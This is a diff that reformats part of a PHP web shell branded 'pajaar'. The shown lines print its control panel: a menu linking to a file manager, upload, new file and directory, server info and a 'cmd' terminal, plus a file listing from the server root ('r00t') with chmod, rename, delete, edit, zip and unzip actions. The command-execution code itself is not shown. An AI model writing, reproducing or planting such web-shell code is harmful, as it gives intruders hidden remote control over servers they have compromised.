@@ -190,18 +190,18 @@ $pjrdor = str_replace('\\','/',$pjrdor);
 $pjrdorz = explode('/',$pjrdor);
 
 // menu
-    echo "<div class='pjrnot'>";
-	echo "<br><a href=?><i class='fa fa-home'></i></a> | ";
-	echo "<a title='file' href=?manager><i class='fa fa-folder'></i></a> | ";
-	echo "<a title='new dir' href='?newdir&dor=$pjrdor'><i class='fa fa-folder-plus'></i></a> | ";
-	echo "<a title='new file' href='?newfile&dor=$pjrdor'><i class='fa fa-file-medical'></i></a> | ";
-	echo "<a title='upload' href='?upload&dor=$pjrdor'><i class='fa fa-file-upload'></i></a> | ";
-	echo "<a title='info' href='?winfo'><i class='fa fa-info-circle'></i></a> | ";
-	echo "<a title='cmd' href='?cmd'><i class='fa fa-terminal'></i></a>";
-	echo "</div>";
+echo "<div class='pjrnot'>";
+echo "<br><a href=?><i class='fa fa-home'></i></a> | ";
+echo "<a title='file' href=?manager><i class='fa fa-folder'></i></a> | ";
+echo "<a title='new dir' href='?newdir&dor=$pjrdor'><i class='fa fa-folder-plus'></i></a> | ";
+echo "<a title='new file' href='?newfile&dor=$pjrdor'><i class='fa fa-file-medical'></i></a> | ";
+echo "<a title='upload' href='?upload&dor=$pjrdor'><i class='fa fa-file-upload'></i></a> | ";
+echo "<a title='info' href='?winfo'><i class='fa fa-info-circle'></i></a> | ";
+echo "<a title='cmd' href='?cmd'><i class='fa fa-terminal'></i></a>";
+echo "</div>";
 
 // path /
-    echo "<i class='fa fa-folder-open' style='color: orange'></i>: /<a href=?manager&dor=/>r00t</a>/";	
+echo "<i class='fa fa-folder-open' style='color: orange'></i>: /<a href=?manager&dor=/>r00t</a>/";	
 
 
 // https://stackoverflow.com/questions/6290146/how-to-split-a-dor-properly-in-php
@@ -393,55 +393,53 @@ if(isset($_GET['manager'])){
     foreach($arr as $pjrf){		
         if(is_dir("$pjrdor/$pjrf")){		
             $tot = $pjrdor."/";		
-            echo "<tr><td style='text-align: left'><i class='fa fa-folder-open' style='color: orange'></i> <a href='?manager&dor=".$tot.$pjrf."'>" . $pjrf . "</a></td>";
-			echo "<td>dir</td>";
-			echo "<td>-</td>";
+echo "<tr><td style='text-align: left'><i class='fa fa-folder-open' style='color: orange'></i> <a href='?manager&dor=".$tot.$pjrf."'>" . $pjrf . "</a></td>";
+echo "<td>dir</td>";
+echo "<td>-</td>";
 			
-			// get permission
-			$perm = substr(sprintf('%o', fileperms($tot.$pjrf)), -4);
+// get permission
+$perm = substr(sprintf('%o', fileperms($tot.$pjrf)), -4);
 			
-			echo "<td><a title='chmod' href='?chmod&dor=$tot$pjrf&x=$perm'>".$perm."</a></td>";
-			
-			// get last mod w/ d-m-Y type date
-			echo "<td>".date("d-m-Y", filemtime($tot.$pjrf))."</td>";
-			echo "<td style='text-align: center'>
-			<a title='rename' href='?rename&dor=$tot&x=$pjrf'><i class='fa fa-pencil-alt'></i></a> | 
-			<a title='delete' onclick='return confirm(\"sure delete $pjrf?\")' href='?ddel&dor=$tot$pjrf'><i class='fa fa-trash-alt'></i></a> | 
-            <a title='zip' href='?zip&dor=$tot$pjrf'><i class='fa fa-file-archive'></i></a>			
-			</td></tr>";			
-        }
-    }
+echo "<td><a title='chmod' href='?chmod&dor=$tot$pjrf&x=$perm'>".$perm."</a></td>";
+		
+// get last mod w/ d-m-Y type date
+echo "<td>".date("d-m-Y", filemtime($tot.$pjrf))."</td>";
+echo "<td style='text-align: center'>
+<a title='rename' href='?rename&dor=$tot&x=$pjrf'><i class='fa fa-pencil-alt'></i></a> | 
+<a title='delete' onclick='return confirm(\"sure delete $pjrf?\")' href='?ddel&dor=$tot$pjrf'><i class='fa fa-trash-alt'></i></a> | 
+<a title='zip' href='?zip&dor=$tot$pjrf'><i class='fa fa-file-archive'></i></a></td></tr>";			
+  }
+}
     // looping file
-    foreach($arr as $pjrf){
-        if( ! is_dir("$pjrdor/$pjrf")){
-			$tot = $pjrdor."/";
+foreach($arr as $pjrf){
+if( ! is_dir("$pjrdor/$pjrf")){
+$tot = $pjrdor."/";
+if (file_exists($tot.$pjrf)) {
+echo "<tr><td style='text-align: left'><i class='fa fa-file-alt'></i> <a href='?edit&dor=$pjrdor&file=/$pjrf'>" . $pjrf . "</a></td>";
+echo "<td>file</td>";
 			
-			if (file_exists($tot.$pjrf)) {
-            echo "<tr><td style='text-align: left'><i class='fa fa-file-alt'></i> <a href='?edit&dor=$pjrdor&file=/$pjrf'>" . $pjrf . "</a></td>";
-			echo "<td>file</td>";
+// get converted filesize check human_filesize function
+echo "<td>".human_filesize(filesize($tot.$pjrf))."</td>";
 			
-			// get converted filesize check human_filesize function
-			echo "<td>".human_filesize(filesize($tot.$pjrf))."</td>";
-			
-			$perm = substr(sprintf('%o', fileperms($tot.$pjrf)), -4);
-			echo "<td><a title='chmod' href='?chmod&dor=$tot$pjrf&x=$perm'>".$perm."</a></td>";
-			echo "<td>".date("d-m-Y", filemtime($tot.$pjrf))."</td>";
-			echo "<td style='text-align: center'>
-			<a title='rename' href='?rename&dor=$pjrdor&x=$pjrf'><i class='fa fa-pencil-alt'></i></a> | 
-			<a title='delete' onclick='return confirm(\"sure delete $pjrf?\")' href='?dfil&file=$tot$pjrf'><i class='fa fa-trash-alt'></i></a> | 
-            <a title='edit' href='?edit&dor=$pjrdor&file=/$pjrf'><i class='fa fa-edit'></i></a>";
-			
-			// auto detect .zip file :b
-			echo strpos($pjrf, '.zip') ? ' | <a title="unzip" href="?unzip&dor='.$pjrdor.'&file='.$pjrf.'"><i class="fa fa-file-archive"></i></a>' : '';
-			echo "</td></tr>";		
+$perm = substr(sprintf('%o', fileperms($tot.$pjrf)), -4);
+echo "<td><a title='chmod' href='?chmod&dor=$tot$pjrf&x=$perm'>".$perm."</a></td>";
+echo "<td>".date("d-m-Y", filemtime($tot.$pjrf))."</td>";
+echo "<td style='text-align: center'>
+<a title='rename' href='?rename&dor=$pjrdor&x=$pjrf'><i class='fa fa-pencil-alt'></i></a> | 
+<a title='delete' onclick='return confirm(\"sure delete $pjrf?\")' href='?dfil&file=$tot$pjrf'><i class='fa fa-trash-alt'></i></a> | 
+<a title='edit' href='?edit&dor=$pjrdor&file=/$pjrf'><i class='fa fa-edit'></i></a>";
+
+// auto detect .zip file :b
+echo strpos($pjrf, '.zip') ? ' | <a title="unzip" href="?unzip&dor='.$pjrdor.'&file='.$pjrf.'"><i class="fa fa-file-archive"></i></a>' : '';
+echo "</td></tr>";		
 				
-        } 
-    }
-	} 
-	echo "</table></div>";	
+  } 
+}
+} 
+echo "</table></div>";	
 	
-	// back to top button <a name=#up>
-	echo '<a title="Back to top" href="#up" class="sirkel"><i class="fa fa-arrow-circle-up"></i></a>';
+// back to top button <a name=#up>
+echo '<a title="Back to top" href="#up" class="sirkel"><i class="fa fa-arrow-circle-up"></i></a>';
 } 
 	
 
@@ -450,13 +448,11 @@ echo "<div class=footer>&copy; ".date("Y")." - pajaar made with <i class='fa fa-
 
 // preloader	
 echo "<script type='text/javascript'>
-			var body = document.getElementsByTagName('body')[0];
-			var removeLoading = function() {
-				setTimeout(function() {
-					body.className = body.className.replace(/loading/, '');
-				}, 1000);
-			};
-			removeLoading();
+var body = document.getElementsByTagName('body')[0];
+var removeLoading = function() {
+setTimeout(function() {body.className = body.className.replace(/loading/, '');}, 1000);
+};
+removeLoading();
 </script>
 </body>
 </html>";
